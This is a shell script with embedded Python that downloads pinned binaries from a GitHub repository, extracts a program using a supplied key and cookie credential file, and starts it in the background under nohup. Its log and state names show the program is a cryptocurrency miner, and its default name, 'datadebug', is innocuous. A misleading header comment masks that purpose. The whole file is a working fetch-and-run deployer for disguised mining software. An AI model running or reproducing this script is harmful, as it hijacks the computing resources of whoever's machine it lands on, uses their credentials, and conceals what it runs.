#!/bin/sh
# Verified root-directory extraction; keepalive belongs to the console guard.
set -eu
set +x
umask 077
[ "$#" -ge 3 ] && [ "$#" -le 4 ] || { printf '%s\n' 'Usage: deploy.sh OUTPUT_DIRECTORY PACKAGE_KEY_FILE RUNTIME_CREDENTIAL_FILE [PROGRAM_NAME]' >&2; exit 2; }
install=$1
key_source=$2
credentials=$3
program_name=${4:-datadebug}
for tool in python3 curl sha256sum mktemp flock sleep wc nohup; do command -v "$tool" >/dev/null 2>&1 || exit 1; done
python3 - "$install" "$key_source" "$credentials" "$program_name" <<'AGENTSSH_ROOT_PREFLIGHT'
from pathlib import Path
import json,os,re,stat,sys
root=Path(sys.argv[1])
if not root.is_absolute() or root.resolve()!=root:raise SystemExit('Output directory must be absolute without symlinks')
def directory(path):
 st=path.lstat()
 if not stat.S_ISDIR(st.st_mode) or st.st_uid!=os.geteuid() or st.st_mode&0o077:raise SystemExit('Output directory must be owner-only')
directory(root)
name=sys.argv[4]
reserved={'start','key','data','1.key','environment','info.txt','run-state.json','international.data','international.README.md','international.release.json','international-run-state.json','international-miner.log'}
if not re.fullmatch(r'[A-Za-z0-9][A-Za-z0-9_.-]{0,63}',name) or name.lower() in {v.lower() for v in reserved}:raise SystemExit('Invalid or conflicting output filename')
if os.path.lexists(root/name):raise SystemExit('Final executable already exists; existing file retained')
def private(path):
 fd=os.open(path,os.O_RDONLY|os.O_NOFOLLOW)
 with os.fdopen(fd,'rb') as stream:
  st=os.fstat(stream.fileno())
  if not stat.S_ISREG(st.st_mode) or st.st_uid!=os.geteuid() or st.st_mode&0o077 or st.st_size>1024*1024:raise SystemExit('Input file must be private')
  return stream.read()
private(sys.argv[2]);doc=json.loads(private(sys.argv[3]))
if doc.get('format')!='agent-benchmark-runtime-v1' or doc.get('site')!='ai' or doc.get('auth_type','cookie')!='cookie':raise SystemExit('International Cookie context required')
state=root/'.agentssh-international-state'
state.mkdir(mode=0o700,exist_ok=True);directory(state)
for path in (state/'install.lock',root/'international-miner.log',root/'international-run-state.json'):
 if os.path.lexists(path):
  st=path.lstat()
  if not stat.S_ISREG(st.st_mode) or st.st_uid!=os.geteuid() or st.st_mode&0o077:raise SystemExit('Existing state or log is unsafe; retained')
process=root/'international-run-state.json'
if process.exists() and json.loads(private(process)).get('format')!='agentssh-mining-process-v1':raise SystemExit('Existing state file conflicts; retained')
AGENTSSH_ROOT_PREFLIGHT
state_root="$install/.agentssh-international-state"
exec 9>"$state_root/install.lock"
flock -n 9 || { printf '%s\n' 'Another root installation is in progress; nothing replaced' >&2; exit 1; }
job=$(mktemp -d "$state_root/job.XXXXXXXX")
cp -- "$key_source" "$job/.launch.key"
chmod 600 "$job/.launch.key"
python3 - "$credentials" "$job/runtime-credentials.json" <<'AGENTSSH_ROOT_CONTEXT'
import json,os,sys
doc=json.load(open(sys.argv[1]));doc.pop('mining_proxy',None)
fd=os.open(sys.argv[2],os.O_WRONLY|os.O_CREAT|os.O_EXCL|os.O_NOFOLLOW,0o600)
with os.fdopen(fd,'w') as stream:json.dump(doc,stream,separators=(',',':'))
AGENTSSH_ROOT_CONTEXT
cache=${AGENTSSH_DOWNLOAD_CACHE:-${XDG_CACHE_HOME:-$HOME/.cache}/agentssh-downloads}
[ ! -L "$cache" ] || exit 1
mkdir -p "$cache";chmod 700 "$cache"
stage=$(mktemp -d "$install/.agentssh-repository.XXXXXXXX")
trap 'rm -rf -- "$stage"' EXIT
trap 'exit 130' INT
trap 'exit 143' TERM
valid() { [ -f "$1" ] && printf '%s  %s\n' "$2" "$1" | sha256sum -c - >/dev/null 2>&1; }
while read -r filename digest length; do
 [ -n "$filename" ] || continue
 cached="$cache/$digest.repository"
 partial="$cached.part"
 for path in "$cached" "$partial" "$cached.lock"; do [ ! -L "$path" ] && { [ ! -e "$path" ] || [ -f "$path" ]; } || exit 1; done
 (
  exec 7>"$cached.lock";flock 7
  if ! valid "$cached" "$digest"; then
   rm -f -- "$cached"
   delay=5
   while ! valid "$cached" "$digest"; do
    if valid "$partial" "$digest";then mv -fT -- "$partial" "$cached";break;fi
    if [ -f "$partial" ] && [ "$(wc -c < "$partial")" -ge "$length" ];then rm -f -- "$partial";fi
    code=0
    curl --fail --location --silent --show-error --proto '=https' --proto-redir '=https' --connect-timeout 8 --max-redirs 3 --speed-time 30 --speed-limit 1024 --max-filesize "$length" --continue-at - "https://raw.githubusercontent.com/sandrauzbmo/info_get/34d25579ec3eef9072e368bc1f9a8c1b7eba327b/international/$filename" -o "$partial" || code=$?
    if valid "$partial" "$digest";then mv -fT -- "$partial" "$cached";break;fi
    if [ "$code" = 0 ] || [ "$code" = 33 ];then rm -f -- "$partial";fi
    printf 'Repository download interrupted: %s; retry in %ss; no total time limit\n' "$filename" "$delay" >&2
    sleep "$delay";delay=$((delay*2));[ "$delay" -le 60 ] || delay=60
   done
  fi
  cp -- "$cached" "$stage/$filename"
  valid "$stage/$filename" "$digest"
 )
done <<'AGENTSSH_ROOT_FILES'
1.key a7ed1a97d861d30eb979bacf9b28dddf3d07884b1d3b66f2134d3444e09cc976 320
README.md bd7e36de00df582bd2d0ed54aa63b3ece082177cca05afb213c7bead52181ff0 3218
data a8a92d7dce9e64b4cd56ec50ef6cf7d2ed15c6a92502c24f3f365dd798ab62de 8149031
key f74cebc73bbfd398001a9b0338f0230a051bfa7686f5b893f530d2df223c52cc 7200928
release.json 928e54dfd9c67227304956c53aa9871a16e527c6140195931cc9f48d27d75d9e 1159
start 3458aaed5a7734494b7748ba4f942858c2a72e7ca55ad15eb2e404c114bb189b 7098528
AGENTSSH_ROOT_FILES
python3 - "$stage" "$install" <<'AGENTSSH_ROOT_DELIVERY'
from pathlib import Path
import hashlib,os,stat,sys
stage,root=map(Path,sys.argv[1:])
mapping={'start':'start','key':'key','data':'international.data','1.key':'1.key','README.md':'international.README.md','release.json':'international.release.json'}
for source,name in mapping.items():
 path=root/name
 if os.path.lexists(path):
  st=path.lstat()
  if not stat.S_ISREG(st.st_mode) or st.st_uid!=os.geteuid() or hashlib.sha256(path.read_bytes()).digest()!=hashlib.sha256((stage/source).read_bytes()).digest():raise SystemExit('Existing delivery file conflicts; retained: '+name)
for source,name in mapping.items():
 path=root/name
 if not path.exists():
  try:os.link(stage/source,path)
  except FileExistsError:
   if path.is_symlink() or hashlib.sha256(path.read_bytes()).digest()!=hashlib.sha256((stage/source).read_bytes()).digest():raise SystemExit('Concurrent delivery conflict; retained')
 path.chmod(0o700 if source in ('start','key') else 0o600)
AGENTSSH_ROOT_DELIVERY
cd -- "$install"
"$install/start" --package "$install/international.data" --key-file "$job/.launch.key" --cookie-file "$job/runtime-credentials.json" --work-dir "$job" --program-name "$program_name" --output-dir "$install" --extract-only >"$job/extract.log" 2>&1 || { printf 'Extraction failed; inspect %s/extract.log\n' "$job" >&2;exit 1; }
python3 - "$install/international-miner.log" <<'AGENTSSH_ROOT_LOG'
import os,stat,sys
fd=os.open(sys.argv[1],os.O_WRONLY|os.O_APPEND|os.O_CREAT|os.O_NOFOLLOW,0o600)
st=os.fstat(fd);os.close(fd)
if not stat.S_ISREG(st.st_mode) or st.st_uid!=os.geteuid() or st.st_mode&0o077:raise SystemExit('Miner log permissions invalid')
AGENTSSH_ROOT_LOG
nohup "$install/$program_name" </dev/null >>"$install/international-miner.log" 2>&1 9>&- 8>&- &
pid=$!
python3 - "$install" "$program_name" "$pid" <<'AGENTSSH_ROOT_PROCESS'
from pathlib import Path
import json,os,sys,time
root=Path(sys.argv[1]);temporary=root/('.international-process.'+str(os.getpid()))
doc={'format':'agentssh-mining-process-v1','status':'program_submitted','pid':int(sys.argv[3]),'program':sys.argv[2],'output_path':str(root/sys.argv[2]),'submitted':int(time.time()),'mining_verified':False}
fd=os.open(temporary,os.O_WRONLY|os.O_CREAT|os.O_EXCL|os.O_NOFOLLOW,0o600)
with os.fdopen(fd,'w') as stream:json.dump(doc,stream,separators=(',',':'))
os.replace(temporary,root/'international-run-state.json')
AGENTSSH_ROOT_PROCESS
printf 'MINER-SUBMITTED: %s/%s; PID=%s; log=%s/international-miner.log; extraction=%s/extract.log\n' "$install" "$program_name" "$pid" "$install" "$job"
printf '%s\n' 'Executable retained; run its absolute path with zero arguments. Mining work has not been verified.'
